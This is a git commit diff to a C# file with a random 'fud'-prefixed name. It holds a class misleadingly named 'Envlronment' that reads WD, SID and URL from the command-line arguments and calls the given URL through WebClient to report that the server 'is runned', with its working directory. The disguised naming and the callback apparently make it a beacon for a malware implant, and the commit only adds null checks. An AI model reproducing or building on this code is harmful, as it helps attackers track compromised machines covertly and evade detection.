ff98ba779ae9e13ef55ac82ad309f3cd0097b065
Rahat5528 <143008716+Rahat5528@users.noreply.github.com>
2023-08-23 20:16:42 +0300

    Update fudNjcMa3DLnwZayZtfXvCHbmc5RpKJKvTqFXmqpM7QtEECP7s9AwsTKU5HJsi7F.cs

--- fudNjcMa3DLnwZayZtfXvCHbmc5RpKJKvTqFXmqpM7QtEECP7s9AwsTKU5HJsi7F.cs
+++ fudNjcMa3DLnwZayZtfXvCHbmc5RpKJKvTqFXmqpM7QtEECP7s9AwsTKU5HJsi7F.cs
@@ -8,11 +8,19 @@ public class Envlronment
 	{
 		var args = Environment.GetCommandLineArgs();
 	
-		var wd = args.FirstOrDefault(arg => arg.StartsWith("WD:"))?.Replace("WD:", string.Empty);
-		var sid = args.FirstOrDefault(arg => arg.StartsWith("SID:"))?.Replace("SID:", string.Empty);
-		var url = args.FirstOrDefault(arg => arg.StartsWith("URL:"))?.Replace("URL:", string.Empty);
+		var wd = args.FirstOrDefault(arg => arg.StartsWith("WD:"));
+		wd = wd == null ? null : wd.Replace("WD:", string.Empty);
+
+		var sid = args.FirstOrDefault(arg => arg.StartsWith("SID:"));
+		sid = sid == null ? null : sid.Replace("SID:", string.Empty);
 		
-		var webClient = new WebClient();
-		webClient.DownloadString(url + "Server: *" + (sid ?? "NULL") + "* is runned!\n- " + (wd ?? "NULL"));
+		var url = args.FirstOrDefault(arg => arg.StartsWith("URL:"));
+		url = url == null ? null : url.Replace("URL:", string.Empty);
+
+		if (url != null)
+		{
+			var webClient = new WebClient();
+			webClient.DownloadString(url + "Server: *" + (sid ?? "NULL") + "* is runned!\n- " + (wd ?? "NULL"));
+		}
 	}
 }
